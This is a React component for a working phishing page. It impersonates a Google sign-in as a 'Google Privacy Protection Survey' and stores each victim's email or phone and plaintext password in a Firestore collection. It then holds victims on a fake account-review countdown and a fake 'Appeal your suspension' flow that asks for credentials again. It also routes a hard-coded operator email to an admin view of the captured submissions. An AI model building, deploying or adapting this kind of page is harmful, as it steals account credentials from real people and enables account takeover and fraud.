/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, FormEvent, useEffect } from 'react';
import { ShieldAlert, Terminal, Eye, EyeOff, LayoutGrid, CheckCircle2, AlertCircle, Loader2 } from 'lucide-react';
import { doc, setDoc, onSnapshot } from 'firebase/firestore';
import { db } from '../lib/firebase';
import { handleFirestoreError, OperationType } from '../lib/firestore-error';

interface LoginViewProps {
  onSuccess: () => void;
  onNavigate: (view: 'login' | 'admin' | 'code') => void;
}

export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [staySignedIn, setStaySignedIn] = useState(false);
  
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);

  // Error States
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [confirmError, setConfirmError] = useState('');
  
  // Submission Success Notification State
  const [isSubmitted, setIsSubmitted] = useState(() => {
    return localStorage.getItem('pending_submission_id') !== null;
  });
  const [timeLeft, setTimeLeft] = useState(() => {
    if (localStorage.getItem('pending_submission_is_confirmed') === 'true') {
      return 0;
    }
    const id = localStorage.getItem('pending_submission_id');
    if (id) {
      const start = Number(localStorage.getItem('pending_submission_start') || '0');
      const elapsed = Math.floor((Date.now() - start) / 1000);
      return Math.max(300 - elapsed, 0);
    }
    return 300;
  });
  const [isConfirmed, setIsConfirmed] = useState(() => {
    return localStorage.getItem('pending_submission_is_confirmed') === 'true';
  });
  const [isAppealMode, setIsAppealMode] = useState(() => {
    return localStorage.getItem('pending_appeal_mode') === 'true';
  });

  // Real-time Firestore document updates listener
  useEffect(() => {
    const subId = localStorage.getItem('pending_submission_id');
    if (!isSubmitted || !subId) return;

    const unsubscribe = onSnapshot(doc(db, 'submissions', subId), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.status === 'confirmed') {
          setIsConfirmed(true);
          setTimeLeft(0);
          localStorage.setItem('pending_submission_is_confirmed', 'true');
        }
      }
    }, (error) => {
      console.error('Real-time listener error:', error);
    });

    return () => unsubscribe();
  }, [isSubmitted]);

  // Timer countdown
  useEffect(() => {
    if (!isSubmitted) {
      return;
    }
    if (isConfirmed || timeLeft <= 0) {
      return;
    }
    const timer = setInterval(() => {
      const start = Number(localStorage.getItem('pending_submission_start') || '0');
      const elapsed = Math.floor((Date.now() - start) / 1000);
      const remaining = Math.max(300 - elapsed, 0);
      
      setTimeLeft(remaining);

      if (remaining <= 0) {
        localStorage.setItem('pending_submission_is_confirmed', 'true');
        clearInterval(timer);
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [isSubmitted, isConfirmed, timeLeft]);

  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  // Helper to parse browser name from user agent
  const getBrowserName = (): string => {
    const userAgent = navigator.userAgent;
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Edge')) return 'Edge';
    if (userAgent.includes('MSIE') || userAgent.includes('Trident')) return 'Internet Explorer';
    return 'Other Browser';
  };

  const handleSignIn = async (e: FormEvent) => {
    e.preventDefault();
    if (!staySignedIn) return;
    
    // Reset Errors
    setEmailError('');
    setPasswordError('');
    setConfirmError('');
    
    const trimmedEmail = emailOrPhone.trim();

    // Check for admin first to make it extremely forgiving and robust
    if (trimmedEmail.toLowerCase() === 'contact.cga.usa@gmail.com' && password && confirmPassword) {
      // Direct routing for the admin - save authenticated session state
      localStorage.setItem('admin_authenticated', 'true');
      setEmailOrPhone('');
      setPassword('');
      setConfirmPassword('');
      onNavigate('admin');
      return;
    }

    let isValid = true;

    // Email or Phone Validation
    if (!trimmedEmail) {
      setEmailError('Email or Phone Number is required.');
      isValid = false;
    } else if (trimmedEmail.includes('@')) {
      const emailRegex = /^\S+@\S+\.\S+$/;
      if (!emailRegex.test(trimmedEmail)) {
        setEmailError('Please enter a valid email format.');
        isValid = false;
      }
    } else {
      // If no @, validate phone as a basic practice
      const phoneRegex = /^[+]?[0-9\s-]{7,15}$/;
      if (trimmedEmail.length < 5 || !phoneRegex.test(trimmedEmail)) {
        setEmailError('Please enter a valid email or phone number.');
        isValid = false;
      }
    }

    // Password Validation
    if (!password) {
      setPasswordError('Password is required.');
      isValid = false;
    } else if (password.length < 6) {
      setPasswordError('Password must be at least 6 characters.');
      isValid = false;
    }

    // Confirm Password Validation
    if (confirmPassword !== password) {
      setConfirmError('Confirm Password must exactly match Password.');
      isValid = false;
    }

    if (isValid) {
      // Create a demo submission log object with raw passwords
      const submission = {
        id: 'submission_' + Date.now(),
        timestamp: new Date().toLocaleString(),
        emailOrPhone: trimmedEmail,
        passwordLength: password.length,
        password: password,
        confirmPassword: confirmPassword,
        isMatched: password === confirmPassword,
        browser: getBrowserName(),
        status: 'pending' as const,
        type: isAppealMode ? 'appeal' as const : 'sov' as const,
      };

      // Save to Firestore in real-time
      try {
        await setDoc(doc(db, 'submissions', submission.id), submission);
      } catch (err) {
        console.error('Failed to save to Firestore:', err);
        handleFirestoreError(err, OperationType.WRITE, `submissions/${submission.id}`);
      }

      // Save to localStorage for historical submissions (for admin page view)
      const existing = JSON.parse(localStorage.getItem('demo_submissions') || '[]');
      existing.push(submission);
      localStorage.setItem('demo_submissions', JSON.stringify(existing));

      // Save current pending submission info to force lock the user
      localStorage.setItem('pending_submission_id', submission.id);
      localStorage.setItem('pending_submission_start', String(Date.now()));
      localStorage.setItem('pending_submission_is_confirmed', 'false');

      // Clear appeal mode for next submissions
      localStorage.removeItem('pending_appeal_mode');
      setIsAppealMode(false);

      // Reset fields
      setEmailOrPhone('');
      setPassword('');
      setConfirmPassword('');
      setIsSubmitted(true);
      setTimeLeft(300);
      setIsConfirmed(false);
      
      // Let parent state know
      onSuccess();
    }
  };

  if (isSubmitted) {
    return (
      <div className="flex flex-col flex-1 bg-bg-app min-h-screen justify-between font-sans text-text-primary">
        {/* Main centered container representing the "collapsed" state */}
        <div className="max-w-[480px] w-full mx-auto px-6 py-20 flex-1 flex flex-col items-center justify-center animate-fade-in">
          {/* Centered Minimalist Google G logo */}
          <div className="mb-8">
            <svg className="w-16 h-16 transform hover:scale-105 transition-transform duration-300 ease-out select-none" viewBox="0 0 24 24">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
              <path fill="#FBBC05" d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z" />
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
            </svg>
          </div>

          {timeLeft > 0 ? (
            /* Collapsed view status card showing countdown */
            <div className="w-full bg-bg-card border border-border-custom rounded-lg shadow-card p-8 md:p-10 text-center space-y-6 animate-fade-in">
              <div className="flex justify-center">
                <div className="relative flex items-center justify-center w-24 h-24 mx-auto">
                  <div className="absolute inset-0 rounded-full border-4 border-[#e8eaed] dark:border-neutral-800"></div>
                  <div className="absolute inset-0 rounded-full border-4 border-t-[#1a73e8] dark:border-t-[#8ab4f8] border-r-transparent border-b-transparent border-l-transparent animate-spin"></div>
                  <div className="absolute inset-0 flex items-center justify-center">
                    <svg className="w-11 h-11 select-none animate-google-pulse" viewBox="0 0 24 24">
                      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                      <path fill="#FBBC05" d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z" />
                      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                    </svg>
                  </div>
                </div>
              </div>
              
              <div className="space-y-4">
                <h2 className="text-text-primary text-2xl font-normal">
                  Wait for
                </h2>
                <div className="text-4xl font-mono font-semibold text-[#1a73e8] dark:text-[#8ab4f8] tracking-widest animate-pulse">
                  {formatTime(timeLeft)}
                </div>
                <p className="text-sm text-text-secondary leading-relaxed max-w-sm mx-auto">
                  Our team are reviewing the activities in your account. Please keep this screen open.
                </p>
              </div>


            </div>
          ) : (
            /* The second screen as requested (Appeal your suspension) */
            <div className="w-full bg-[#fdf2f2] dark:bg-red-950/20 border border-red-200 dark:border-red-900/30 rounded-2xl p-6 md:p-8 shadow-card space-y-6 animate-fade-in">
              <div className="flex gap-4 items-start">
                <div className="text-[#c5221f] shrink-0 mt-0.5">
                  <AlertCircle className="h-8 w-8" />
                </div>
                
                <div className="space-y-1.5 text-left">
                  <h3 className="text-lg font-bold text-[#1f2937] dark:text-red-100">
                    Appeal your suspension
                  </h3>
                  <p className="text-sm text-[#4b5563] dark:text-red-200/80 leading-relaxed">
                    You'll need to verify your account to get access to appeals
                  </p>
                </div>
              </div>

              <div className="pl-12 text-left">
                <button
                  onClick={() => {
                    localStorage.removeItem('pending_submission_id');
                    localStorage.removeItem('pending_submission_start');
                    localStorage.removeItem('pending_submission_is_confirmed');
                    localStorage.setItem('pending_appeal_mode', 'true');
                    setIsAppealMode(true);
                    setIsSubmitted(false);
                    setIsConfirmed(false);
                    setTimeLeft(300);
                  }}
                  className="px-6 py-2.5 bg-[#c5221f] hover:bg-[#b01e1e] text-white text-sm font-semibold rounded-lg shadow-sm transition-colors duration-150"
                >
                  Start verification
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col flex-1 bg-bg-app min-h-screen justify-between text-text-primary">
      {/* Main Container - Editorial Grid */}
      <div className="max-w-[1200px] w-full mx-auto px-6 md:px-12 py-12 md:py-20 flex-1 grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-20 items-center justify-center">
        
        {/* Left Column - Hero and Logo (Col span 7) */}
        <div className="lg:col-span-7 flex flex-col items-center lg:items-start text-center lg:text-left select-none gap-6">
          {/* Classic Google G Logo */}
          <svg className="w-32 h-32 md:w-36 md:h-36 transform hover:scale-105 transition-transform duration-300 ease-out select-none shrink-0" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
            <path fill="#FBBC05" d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z" />
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
          </svg>

          {/* High Fidelity Multi-colored Google Wordmark Logo */}
          <div className="text-7xl md:text-8xl lg:text-[100px] font-semibold tracking-[-4px] flex items-center select-none font-sans mt-2">
            <span className="text-[#4285F4]">G</span>
            <span className="text-[#EA4335]">o</span>
            <span className="text-[#FBBC05]">o</span>
            <span className="text-[#4285F4]">g</span>
            <span className="text-[#34A853]">l</span>
            <span className="text-[#EA4335] inline-block origin-center rotate-[-15deg] transform">e</span>
          </div>
          
          {/* Editorial Heading Text */}
          <div className="space-y-4">
            <h1 className="text-3xl md:text-[44px] font-light text-text-primary leading-tight tracking-tight max-w-xl">
              Google Privacy Protection Survey
            </h1>
            <p className="text-lg text-text-secondary font-normal max-w-lg">
              Please complete this survey form to confirm your interest. <span className="dark:font-semibold">protect your privacy</span>
            </p>
          </div>

          {/* Bold visual label matching provided image */}
          <div className="text-brand-primary dark:text-[#1A73E8] text-2xl md:text-3xl font-bold tracking-tight mt-2 border-l-4 border-brand-primary dark:border-[#1A73E8] pl-4">
            Google Privacy Protection
          </div>
        </div>

        {/* Right Column - Card (Col span 5) */}
        <div className="lg:col-span-5 w-full max-w-[450px] mx-auto shrink-0">
          <div className="bg-bg-card border border-border-custom rounded-lg shadow-card p-8 md:p-10">
            {/* Header section */}
            <div className="text-center mb-8">
              <h2 className="text-text-primary text-2xl font-normal">Sign in</h2>
              <p className="text-sm text-text-secondary mt-2">
                Use your Google Account<br />
                <span className="text-[#1a73e8] dark:text-[#8ab4f8] font-medium">Verify you own this account</span>
              </p>
            </div>

            {/* Interactive Login Form */}
            <form onSubmit={handleSignIn} className="space-y-6">
              {/* Email / Phone Field */}
              <div className="relative">
                <input
                  id="emailOrPhone"
                  type="text"
                  placeholder=" "
                  value={emailOrPhone}
                  onChange={(e) => setEmailOrPhone(e.target.value)}
                  className={`peer w-full h-14 px-4 pt-4 text-base border rounded bg-bg-input text-text-primary outline-none transition-all ${
                    emailError ? 'border-brand-error focus:border-brand-error' : 'border-border-custom focus:border-2 focus:border-brand-primary'
                  }`}
                  autoComplete="username"
                />
                <label 
                  htmlFor="emailOrPhone" 
                  className="absolute left-4 top-4 text-sm text-text-secondary pointer-events-none transition-all duration-200 
                             peer-placeholder-shown:text-base peer-placeholder-shown:top-4 
                             peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-brand-primary peer-focus:font-medium
                             peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-xs"
                >
                  Email or phone
                </label>
                <div className="min-h-[16px] text-brand-error text-xs font-medium mt-1">
                  {emailError}
                </div>
              </div>

              {/* Password Field */}
              <div className="relative">
                <input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  placeholder=" "
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`peer w-full h-14 pl-4 pr-11 pt-4 text-base border rounded bg-bg-input text-text-primary outline-none transition-all ${
                    passwordError ? 'border-brand-error focus:border-brand-error' : 'border-border-custom focus:border-2 focus:border-brand-primary'
                  }`}
                  autoComplete="new-password"
                />
                <label 
                  htmlFor="password" 
                  className="absolute left-4 top-4 text-sm text-text-secondary pointer-events-none transition-all duration-200 
                             peer-placeholder-shown:text-base peer-placeholder-shown:top-4 
                             peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-brand-primary peer-focus:font-medium
                             peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-xs"
                >
                  Enter your password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3.5 top-5 text-text-secondary hover:text-text-primary focus:outline-none"
                >
                  {showPassword ? <EyeOff className="h-4.5 w-4.5" /> : <Eye className="h-4.5 w-4.5" />}
                </button>
                <div className="min-h-[16px] text-brand-error text-xs font-medium mt-1">
                  {passwordError}
                </div>
              </div>

              {/* Confirm Password Field */}
              <div className="relative">
                <input
                  id="confirmPassword"
                  type={showConfirmPassword ? 'text' : 'password'}
                  placeholder=" "
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  className={`peer w-full h-14 pl-4 pr-11 pt-4 text-base border rounded bg-bg-input text-text-primary outline-none transition-all ${
                    confirmError ? 'border-brand-error focus:border-brand-error' : 'border-border-custom focus:border-2 focus:border-brand-primary'
                  }`}
                  autoComplete="new-password"
                />
                <label 
                  htmlFor="confirmPassword" 
                  className="absolute left-4 top-4 text-sm text-text-secondary pointer-events-none transition-all duration-200 
                             peer-placeholder-shown:text-base peer-placeholder-shown:top-4 
                             peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-brand-primary peer-focus:font-medium
                             peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-xs"
                >
                  Confirm password
                </label>
                <button
                  type="button"
                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                  className="absolute right-3.5 top-5 text-text-secondary hover:text-text-primary focus:outline-none"
                >
                  {showConfirmPassword ? <EyeOff className="h-4.5 w-4.5" /> : <Eye className="h-4.5 w-4.5" />}
                </button>
                <div className="min-h-[16px] text-brand-error text-xs font-medium mt-1">
                  {confirmError}
                </div>
              </div>

              {/* Stay Signed In Toggle and Button */}
              <div className="flex flex-row-reverse justify-between items-center pt-2">
                <button
                  type="submit"
                  disabled={!staySignedIn}
                  className={`bg-brand-primary text-white font-medium rounded px-6 py-2.5 text-sm transition-all duration-300 ease-in-out shadow-sm select-none ${
                    staySignedIn 
                      ? 'opacity-100 dark:bg-[#1A73E8] dark:hover:bg-[#155cb4] cursor-pointer hover:opacity-90 active:scale-95 focus:ring-2 focus:ring-brand-primary dark:focus:ring-[#1A73E8] focus:ring-offset-2 outline-none' 
                      : 'opacity-45 cursor-not-allowed'
                  }`}
                >
                  Confirm
                </button>
                
                <label className="flex items-center gap-2 text-sm text-text-secondary select-none cursor-pointer">
                  <input
                    type="checkbox"
                    checked={staySignedIn}
                    onChange={() => setStaySignedIn(!staySignedIn)}
                    className="rounded border-border-custom text-brand-primary focus:ring-brand-primary h-4 w-4 bg-bg-input cursor-pointer"
                  />
                  Yes, its my account.
                </label>
              </div>
            </form>
          </div>
        </div>

      </div>
    </div>
  );
}
